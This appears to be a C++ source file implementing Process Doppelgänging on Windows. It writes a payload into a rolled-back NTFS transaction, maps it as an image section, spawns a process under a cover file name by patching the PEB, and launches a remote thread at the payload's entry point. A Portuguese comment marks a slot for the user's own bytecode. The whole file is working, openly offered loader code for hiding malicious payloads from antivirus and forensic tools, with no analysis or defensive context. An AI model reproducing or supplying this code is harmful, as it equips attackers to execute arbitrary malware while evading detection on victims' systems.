#include <Windows.h>
#include <ktmw32.h>
#include <stdio.h>

#include "nt_init_func.hpp"
#include "DoppelProcess.hpp"


#define NTSUCCESS(status) (status == (NTSTATUS)0x00000000L)

BYTE tempBuf[1000] = { 0 }; // seu ByteCode aqui
NTSTATUS status;


void frinting() {
	printf("NtCreateSection : %p\n", pNtCreateSection);
	printf("NtQueryInformationProcess : %p\n", pNtQueryInformationProcess);
	printf("NtCreateProcessEx : %p\n", pNtCreateProcessEx);
	printf("RtlCreateProcessParametersEx : %p\n", pRtlCreateProcessParametersEx);
	printf("RtlInitUnicodeString : %p\n", pRtlInitUnicodeString);
}

HANDLE CreateSectionFromTransaction(CHAR* transactFile, payload_data payload) {
	HANDLE hTransaction = ::CreateTransaction(0, 0, TRANSACTION_DO_NOT_PROMOTE, 0, 0, 0, 0);
	if (hTransaction == INVALID_HANDLE_VALUE) {
		printf("Unable to create transaction %d\n", ::GetLastError());
		exit(0);
	}

	HANDLE hTransactedFile = ::CreateFileTransactedA(transactFile, GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0, hTransaction, 0, 0);
	if (hTransactedFile == INVALID_HANDLE_VALUE) {
		printf("Unable to create transacted file %d\n", ::GetLastError());
		exit(0);
	}

	if (!::WriteFile(hTransactedFile, payload.buf, payload.size, 0, 0)) {
		printf("Unable to write to transacted file %d\n", ::GetLastError());
		exit(0);
	}

	HANDLE hSection;
	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
	if (!NTSUCCESS(status)) {
		printf("NtCreateSection failed : %x\n", status);
	}

	::RollbackTransaction(hTransaction);
	::CloseHandle(hTransactedFile);
	::CloseHandle(hTransaction);

	return hSection;
}

void CreateProcessFromSection(WCHAR* coverFile, payload_data payload, HANDLE hSection) {
	HANDLE hProcess;
	status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, 0, ::GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, 0, 0, 0);
	if (!NTSUCCESS(status)) {
		printf("NtCreateProcessEx failed : %x\n", status);
		exit(0);
	}
	IMAGE_DOS_HEADER* pDOSHdr = (IMAGE_DOS_HEADER*)payload.buf;
	IMAGE_NT_HEADERS64* pNTHdr = (IMAGE_NT_HEADERS64*)(payload.buf + pDOSHdr->e_lfanew);
	DWORD64 entryPointRVA = pNTHdr->OptionalHeader.AddressOfEntryPoint;

	PROCESS_BASIC_INFORMATION pbi;
	status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), 0);
	::ReadProcessMemory(hProcess, pbi.PebBaseAddress, &tempBuf, sizeof(PEB), 0);
	DWORD64 baseAddr = (DWORD64)((PPEB)tempBuf)->ImageBaseAddress;

	DWORD64 entryPoint = baseAddr + entryPointRVA;

	UNICODE_STRING uStr;
	pRtlInitUnicodeString(&uStr, coverFile);

	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	status = pRtlCreateProcessParametersEx(&ProcessParameters, &uStr, 0, 0, &uStr, 0, 0, 0, 0, 0, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NTSUCCESS(status)) {
		printf("RtlCreateProcessParametersEx failed : %x\n", status);
		exit(0);
	}

	DWORD size = ProcessParameters->EnvironmentSize + ProcessParameters->MaximumLength;
	LPVOID MemoryPtr = ProcessParameters;
	MemoryPtr = ::VirtualAllocEx(hProcess, MemoryPtr, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (!::WriteProcessMemory(hProcess, ProcessParameters, ProcessParameters, size, 0)) {
		printf("Unable to update process parameters : %d\n", ::GetLastError());
		exit(0);
	}

	PPEB peb = (PPEB)pbi.PebBaseAddress;
	if (!::WriteProcessMemory(hProcess, &peb->ProcessParameters, &ProcessParameters, sizeof(DWORD64), 0)) {
		printf("Unable to update PEB : %d\n", ::GetLastError());
		exit(0);
	}

	HANDLE hThread = ::CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)entryPoint, 0, 0, 0);
	if (!hThread) {
		printf("Unable to create remote thread : %d\n", ::GetLastError());
		exit(0);
	}

	::CloseHandle(hSection);
	::CloseHandle(hProcess);
	::CloseHandle(hThread);

	return;
}

void DoppelGangProcess(CHAR* transactFile, WCHAR* coverFile, payload_data payload) {
	HANDLE hSection = CreateSectionFromTransaction(transactFile, payload);
	CreateProcessFromSection(coverFile, payload, hSection);
	return;
}